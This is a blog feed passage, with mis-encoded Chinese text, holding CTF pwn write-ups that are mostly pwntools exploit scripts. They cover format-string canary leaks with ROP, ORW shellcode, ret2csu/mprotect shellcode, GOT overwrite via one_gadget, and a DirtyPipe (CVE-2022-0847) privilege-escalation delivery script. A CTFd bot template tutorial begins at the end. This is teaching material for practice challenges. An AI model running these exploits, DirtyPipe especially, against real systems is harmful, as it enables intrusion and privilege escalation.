    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>ç”±äºçŸ¥é“è¿™ä¸ªæ¯”èµ›æ¯”è¾ƒæ™šï¼Œæ­£å¼å‚ä¸æ¯”èµ›æ˜¯ç¬¬å››å‘¨çš„å‘¨ä¸‰æ™šä¸Šï¼Œè¿˜å·®ä¸€é“å †ğŸï¼Œæ²¡æœ‰å®ŒæˆAK(ä½†æ˜¯æ‹¿äº†å››ä¸ªä¸€è¡€ä¹Ÿå¥½çˆ½)ã€‚æœ€åä¸€é¢˜æœªè§£ä¸»è¦åŸå› ç¡®å®æ˜¯è‡ªå·±åœ¨_IO_Fileç›¸å…³åˆ©ç”¨äº†è§£ä¸è¶³ï¼Œèµ›åæ‰¾å¤œæ‚ å¸ˆå‚…æ‹¿åˆ°äº†expï¼ŒçœŸçš„å¥½æ„Ÿè°¢ğŸŒ¹</p></blockquote><p><img src="/img/article/newstarctf/image-20221017112826465.png" alt="æˆ˜ç»©æˆªå›¾"></p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œç­‰æˆ‘å¼€å§‹åšé¢˜çš„æ—¶å€™å·²ç»æœ‰4ä¸ªè§£äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,26078)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># pause()</span><br>io.recvuntil(<span class="hljs-string">&#x27;Now answer me, will you v me 50&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%11$p%9$p&#x27;</span>)<br>io.recvline()<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>code_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x840</span> <br>success(<span class="hljs-string">&quot;canary --&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br>success(<span class="hljs-string">&quot;code_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(code_base))<br><br>money = code_base + <span class="hljs-number">0x20206c</span><br>payload =  <span class="hljs-string">b&#x27;%99c%7$n&#x27;</span> + p64(money)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;What do you want to say to the canary&#x27;</span>)<br>io.sendline(payload)<br>io.recvline()<br>binsh = code_base + <span class="hljs-number">0x202020</span><br>pop_rdi = code_base+<span class="hljs-number">0x0000000000000b33</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>syscall = code_base + <span class="hljs-number">0x9dc</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(syscall)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="OhMyShellcode"><a href="#OhMyShellcode" class="headerlink" title="OhMyShellcode"></a>OhMyShellcode</h2><p>ä¸€é“orwçš„shellcodeé¢˜ç›®ï¼Œé¢˜ç›®ä¸“é—¨å¼€äº†ä¸€ä¸ªç©ºé—´ç”¨äºæ”¾ç½®orwï¼Œä¹Ÿæ¯”è¾ƒç®€å•ã€‚å…³é”®åœ¨äºç¬¬ä¸€æ¬¡è¯»å…¥æœ‰ä¸ªåˆ¤æ–­ï¼Œä¼šæ‹¦ä½<code>\x0f</code>ï¼Œä½†æ˜¯æ£€æµ‹é•¿åº¦å¹¶ä¸å®Œå…¨ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25430</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>backdoor = <span class="hljs-number">0x233000</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Show me your magic.&#x27;</span>)<br>read = <span class="hljs-string">&#x27;&#x27;&#x27;mov rsi,0x23301e</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>sh = asm(read)<br>sh2 =asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>sh2+=asm(shellcraft.read(<span class="hljs-number">3</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>sh2+=asm(shellcraft.write(<span class="hljs-number">1</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>io.send(sh)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;Good luck!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(backdoor)<br>io.sendline(payload)<br>raw_input()<br>io.sendline(sh2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2csu2"><a href="#ret2csu2" class="headerlink" title="ret2csu2"></a>ret2csu2</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å»çœ‹ç¬¬ä¸‰å‘¨çš„ret2csuï¼Œå¤œæ‚ å¸ˆå‚…çš„è¯„ä»·æ˜¯è¿™æ ·çš„ï¼Œä¸å¾—ä¸è¯´è¿™ä¸ªé¢˜çš„gadgetè¿˜æ˜¯å¾ˆæ¼‚äº®çš„ã€‚</p><p><img src="/img/article/newstarctf/image-20221017121338219.png" alt="ä¼šç©å°±è¡Œ"></p><p>ç¬¬ä¸€æ¬¡payloadè¦æ”¹rbpåˆ°bssæ®µï¼ŒåŒæ—¶è·³è½¬å›<code>sys_read</code>ï¼Œå®ç°å¯¹bsså†™å…¥<code>ret2csu</code>çš„ropè°ƒç”¨<code>mprotect</code>ï¼Œä»¥åŠshellcodeå¸ƒç½®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29895</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>csu_end_addr = <span class="hljs-number">0x40075a</span><br>csu_front_addr = <span class="hljs-number">0x400740</span><br><br>mprotect = <span class="hljs-number">0x40067b</span><br>mprotect_plt = <span class="hljs-number">0x600fe8</span><br>bss = <span class="hljs-number">0x601110</span><br>bss1 = <span class="hljs-number">0x601020</span><br>leave_ret =<span class="hljs-number">0x400681</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sc = asm(shellcraft.sh())<br>    payload +=sc<br>    payload += <span class="hljs-string">b&#x27;b&#x27;</span> *<span class="hljs-number">0x40</span><br>    payload += p64(bss1-<span class="hljs-number">0x8</span>)<br>    payload += p64(leave_ret)<br>    io.send(payload)<br>    <span class="hljs-comment"># sleep(1)</span><br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;check it!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(bss)+p64(<span class="hljs-number">0x4006e7</span>)<br>io.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br><br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,mprotect_plt,<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x6010a0</span>)<br><br>io.interactive()ma<br></code></pre></td></tr></table></figure><h2 id="è¿™æ˜¯å †ğŸ´"><a href="#è¿™æ˜¯å †ğŸ´" class="headerlink" title="è¿™æ˜¯å †ğŸ´"></a>è¿™æ˜¯å †ğŸ´</h2><p>è¿™é“é¢˜ç”±äºheapè§’æ ‡æ£€æµ‹å¯ä»¥ä¸ºè´Ÿï¼Œåˆ©ç”¨ä¸€ä¸ªæŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆå®ç°ä»»æ„åœ°å€å†™ï¼ŒéšååŠ«æŒgotä¸ºone_gadgetå³å¯</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28432</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>heap = <span class="hljs-number">0x6020e0</span><br>puts = <span class="hljs-number">0x602018</span> <span class="hljs-comment">#-25</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    io.sendline(text)<br><br>edit(-<span class="hljs-number">12</span>,p64(<span class="hljs-number">0x602038</span>))    <br>show(-<span class="hljs-number">12</span>)<br><br><span class="hljs-comment"># io.recvunti(&#x27;Content:&#x27;)</span><br>puts = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts - libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>pause()<br>success(<span class="hljs-string">&quot;puts_addr--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(puts))<br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>edit(-<span class="hljs-number">12</span>,p64(one_gadget))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="KMario"><a href="#KMario" class="headerlink" title="KMario"></a>KMario</h2><p>ä¸€é“kernelé¢˜ç›®ï¼Œåˆ©ç”¨CVE-2022-0847å®ç°æœ¬åœ°ææƒã€‚å…³é”®åœ¨äºè¿œç«¯æ²¡æœ‰gccï¼Œæ‰€ä»¥åªèƒ½æœ¬åœ°ç¼–è¯‘å¥½ã€‚å…ˆæŠŠelfè½¬ä¸ºbase64ï¼Œéšååœ¨è¿œç«¯è½¬å›elfæ–‡ä»¶å³å¯ã€‚</p><blockquote><p>POCé“¾æ¥ï¼š<a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">CVE-2022-0847-DirtyPipe-Exploits</a></p><p>ä¸è¿‡æˆ‘è‡ªå·±åšçš„æ—¶å€™ä¼¼ä¹ç”±äºelfæ–‡ä»¶å¤ªå¤§ï¼Œä¸€ç›´ä¼ ä¸ä¸Šå»ï¼Œçœ‹äº†å¤œæ‚ å¸ˆå‚…çš„expæ‰å‘ç°å‹ç¼©ä¸€ä¸‹å°±å¥½ï¼Œæˆ‘çœŸæ˜¯ä¸ªé“¸å¸</p></blockquote><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>cmd = <span class="hljs-string">&#x27;$ &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">r</span>):<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;stty -echo&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;gzip -c ./exp2 &gt; ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cd /tmp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)<br>    r.sendline((read(<span class="hljs-string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>    r.sendline(<span class="hljs-string">&#x27;EOF&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;gunzip ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;chmod +x ./exp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;./exp /pwnmeplz&#x27;</span>)<br>    r.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25457</span>)<br><span class="hljs-comment"># p = process(&#x27;./start.sh&#x27;)</span><br>exploit(p)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CTFd äºŒæ¬¡å¼€å‘ã€‘è§£é¢˜æ’­æŠ¥æœºå™¨äºº V1</title>
    <link href="/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/"/>
    <url>/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡åŸºäº CTFd Version 3.4.3 å¼€å‘ï¼Œå¯èƒ½å­˜åœ¨æºç ä¸ç›¸åŒçš„æƒ…å†µï¼Œé˜…è¯»æ—¶è¯·æ³¨æ„æ–‡ç« æ—¶æ•ˆæ€§ã€‚æœºå™¨äººä¼šä¸€ç›´æ›´æ–°ï¼Œåç»­åº”è¯¥ä¼šæœ‰ä¸€äºŒä¸‰è¡€æ’­æŠ¥ç­‰æ›´è¯¦å°½çš„åŠŸèƒ½</p><p>æ³¨ï¼šæœ¬æ–‡ä¸åšæœºå™¨äººç›¸å…³ä»£ç æ›´æ”¹ï¼Œç›´æ¥åˆ©ç”¨nonebotè‡ªå¸¦æ¥å£å®ç°</p></blockquote><h2 id="å‰ç«¯é¡µé¢ä¿®æ”¹"><a href="#å‰ç«¯é¡µé¢ä¿®æ”¹" class="headerlink" title="å‰ç«¯é¡µé¢ä¿®æ”¹"></a>å‰ç«¯é¡µé¢ä¿®æ”¹</h2><h3 id="config-html"><a href="#config-html" class="headerlink" title="config.html"></a>config.html</h3><p>æ‰“å¼€<code>CTFd/CTFd/themes/admin/templates/config.html</code>ï¼Œæ›´æ”¹å·¦ä¾§æ ç›®æ ‡é¢˜</p><p><img src="/img/article/botv1/image-20221011092121090.png" alt="config.html"></p><h3 id="apperance-html"><a href="#apperance-html" class="headerlink" title="apperance.html"></a>apperance.html</h3><p>æ‰“å¼€<code>CTFd/CTFd/themes/admin/templates/configs/appearance.html</code>ï¼Œåœ¨å…¶ä¸­æ’å…¥ä»£ç ï¼Œå®Œæ•´htmlå¦‚ä¸‹</p><blockquote><p>å› å¯èƒ½å­˜åœ¨CTFdä¸åŒç‰ˆæœ¬é¡µé¢ä¸åŒçš„é—®é¢˜ï¼Œè¯·è§†å…·ä½“æƒ…å†µæ›´æ”¹htmlé¡µé¢</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tabpanel&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tab-pane config-section active&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;appearance&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-100&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ctf_name&quot;</span>&gt;</span><br>Competition Name<br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span>Competition name displayed instead of a logo<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;CTF Name&quot;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">ctf_name</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">ctf_name</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; ctf_name &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>CTF Description<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>Description for the CTF<br><span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>&#123;&#123; ctf_description &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-ip&quot;</span>&gt;</span><br>                Bot Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    the address of QQ-bot<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    eg. 127.0.0.1:1234<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-ip&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bot_ip&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot_ip</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bot_ip</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bot_ip &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;group-id&quot;</span>&gt;</span><br>                QQ Group Number<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;group-id&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;group_id&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">group_id</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">group_id</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; group_id &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> 